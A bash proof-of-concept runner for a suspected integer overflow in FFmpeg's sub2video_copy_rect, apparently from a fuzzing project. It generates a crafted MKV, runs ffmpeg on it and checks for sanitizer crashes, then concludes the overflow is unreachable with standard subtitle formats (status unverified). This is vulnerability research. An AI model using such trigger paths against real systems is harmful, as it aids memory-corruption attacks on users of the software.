#!/usr/bin/env bash
# vuln_001_run.sh - PoC runner for VULN-001
# Target: sub2video_copy_rect() integer overflow in fftools/ffmpeg_filter.c:319
#
# Trigger path: ffmpeg -i <crafted_mkv> -filter_complex '[0:v][0:s]overlay' -f null -
#   -> filter_thread() -> sub2video_frame() -> sub2video_update() -> sub2video_copy_rect()
#
# Expected observation:
#   - With standard 16-bit subtitle coords (max 65535), the bounds check at line 319
#     fires correctly and logs "sub2video: rectangle (...) overflowing 320 240".
#   - No crash occurs because the overflow condition requires r->x near INT_MAX,
#     which standard subtitle formats cannot produce.
#
# For actual INT_MAX overflow: would need r->x >= 0x20000000 (536870912) so that
# r->x * 4 overflows signed 32-bit int. Unreachable via standard subtitle codecs.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="${SCRIPT_DIR}/vuln_001_input.mkv"
LOG="${SCRIPT_DIR}/vuln_001_run.log"

{
echo "================================================================="
echo " VULN-001: sub2video_copy_rect Integer Overflow PoC"
echo " Target: fftools/ffmpeg_filter.c lines 308-336"
echo " CWE: CWE-190 -> CWE-787"
echo " Date: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "================================================================="
echo ""
echo "[*] FFmpeg binary: $FFMPEG"
echo "[*] Input file:    $INPUT"
echo ""

# ── Step 1: Generate input ────────────────────────────────────────────────────
echo "─── Step 1: Generating crafted MKV ──────────────────────────────────────"
python3 "${SCRIPT_DIR}/vuln_001_gen.py"
echo ""

# ── Step 2: Verify the file was created ──────────────────────────────────────
if [[ ! -f "$INPUT" ]]; then
    echo "[ERROR] Input file not generated. Aborting."
    exit 1
fi
echo "[*] File size: $(stat -c%s "$INPUT") bytes"
echo ""

# ── Step 3: Run ffmpeg to trigger sub2video path ──────────────────────────────
echo "─── Step 2: Triggering sub2video_copy_rect via filter_complex ────────────"
echo "[*] Command: $FFMPEG -i $INPUT -filter_complex '[0:v][0:s]overlay' -frames:v 5 -f null -"
echo ""

set +e
"$FFMPEG" \
    -loglevel debug \
    -i "$INPUT" \
    -filter_complex '[0:v][0:s]overlay' \
    -frames:v 5 \
    -f null - 2>&1
EXIT1=$?
set -e
echo ""
echo "[*] Exit code (attempt 1): $EXIT1"
echo ""

# ── Step 4: Alternative trigger - just decode subtitle stream ─────────────────
echo "─── Step 3: Alternative trigger - decode subtitle stream directly ─────────"
echo "[*] Command: $FFMPEG -i $INPUT -map 0:s -f null -"
echo ""
set +e
"$FFMPEG" \
    -loglevel verbose \
    -i "$INPUT" \
    -map 0:s \
    -c:s copy \
    -f null - 2>&1
EXIT2=$?
set -e
echo ""
echo "[*] Exit code (attempt 2): $EXIT2"
echo ""

echo "================================================================="
echo " RESULT SUMMARY"
echo "================================================================="

} 2>&1 | tee "$LOG"

# Check log for crash/ASAN indicators
ASAN_HIT=0
SUB2VIDEO_HIT=0

if grep -qi "AddressSanitizer\|heap-buffer-overflow\|stack-buffer-overflow\|use-after-free" "$LOG" 2>/dev/null; then
    ASAN_HIT=1
fi
if grep -qi "sub2video" "$LOG" 2>/dev/null; then
    SUB2VIDEO_HIT=1
fi

{
if [[ $ASAN_HIT -eq 1 ]]; then
    echo "[!!!] ASAN/CRASH DETECTED - Vulnerability may be triggered!"
    echo "      Review $LOG for details."
else
    echo "[ - ] No ASAN crash detected."
fi

if [[ $SUB2VIDEO_HIT -eq 1 ]]; then
    echo "[+++] sub2video code path WAS reached (sub2video messages found in log)."
else
    echo "[ - ] sub2video path not confirmed in log output."
fi

echo ""
echo "Analysis:"
echo "  - Vulnerability CWE-190 (integer overflow in r->x + r->w) requires"
echo "    r->x near INT_MAX. Standard PGS/DVB/DVDSUB/XSUB subtitle formats"
echo "    all use 16-bit coordinates (max 65535), which cannot produce"
echo "    the overflow condition."
echo "  - The bounds check at ffmpeg_filter.c:319 correctly handles 16-bit"
echo "    out-of-bounds coordinates by logging and returning early."
echo "  - To trigger the actual overflow, a subtitle decoder would need to"
echo "    produce r->x >= 536870912 (0x20000000) or r->y >= similar value."
echo "  - Status: UNVERIFIED (code path reached; overflow condition not"
echo "    achievable via standard subtitle file formats)"
echo ""
echo "Log saved to: $LOG"
} 2>&1 | tee -a "$LOG"
